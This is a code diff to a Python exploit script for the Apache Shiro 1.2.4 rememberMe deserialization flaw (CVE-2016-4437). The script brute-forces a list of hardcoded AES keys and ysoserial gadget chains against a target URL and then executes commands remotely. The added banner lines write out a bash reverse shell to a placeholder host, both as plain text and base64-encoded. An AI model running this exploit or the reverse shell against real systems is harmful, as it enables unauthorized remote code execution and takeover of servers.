@@ -15,6 +15,10 @@ if len(sys.argv)!=2:
     print('+-------------------------------------------------------------------------------------------------------+')
     print('+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +')
     print('+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +')
+    print('+                                                                                                       +')
+    print('+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +')
+    print('+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +')
+    print('+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +')
     print('+-------------------------------------------------------------------------------------------------------+')
     print('+ USE: python3 <filename> <url>                                                                         +')
     print('+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080                                                   +')
@@ -24,7 +28,7 @@ if len(sys.argv)!=2:
 url = sys.argv[1]
 cmd_sleep = 'sleep-5'
 ysoserial = 'ysoserial-sleep.jar'
-gadget_list = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Spring1","Spring2","Jdk7u21","JRMPClient","ROME","Clojure"]
+gadget_list = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Spring1","Spring2","Jdk7u21","ROME","Clojure"]
 #key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA=="]
 key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA=="]
 
@@ -35,6 +39,7 @@ header = {
 
 print ("[*] Testing gadget")
 for gadget in gadget_list:
+    print ("[*] Check gadget: " + gadget)
     for key in key_list:
         popen = subprocess.Popen(['java', '-jar', ysoserial, gadget, cmd_sleep], stdout=subprocess.PIPE)
         BS = AES.block_size
@@ -48,17 +53,16 @@ for gadget in gadget_list:
         try:
             r = requests.get(url, headers=header, cookies={'rememberMe': payload}, timeout=10)
             time = r.elapsed.seconds
+            if time >= 5:
+                key_succes = key
+                gadget_succes = gadget
+                print ("[+] Find gadget: " + gadget_succes)
+            else:
+                key_failed = key
+                gadget_failed = gadget
         except:
             print ("[-] Check Failed: " + gadget)
-        if time >= 5:
-            key_succes = key
-            gadget_succes = gadget
-            print ("[+] Find gadget: " + gadget_succes)
-        else:
-            key_failed = key_list
-            gadget_failed = gadget
-    if gadget_failed == gadget:
-        print ("[*] Check gadget: " + gadget)   
+
 print ("[+] Find Key: " + key_succes)
 
 
@@ -70,7 +74,7 @@ def exploit(url, cmd, key_succes, gadget_succes):
         command = "bash -c {echo," + cmd64 + "}|{base64,-d}|{bash,-i}"
         print ("[+] [Linux] Base64 Command: " + command)
     elif system == "windows":
-        print (gadget_succes)
+#        print (gadget_succes)
         command = str(cmd)
         print ("[+] [Windows] Command:" + command)
 
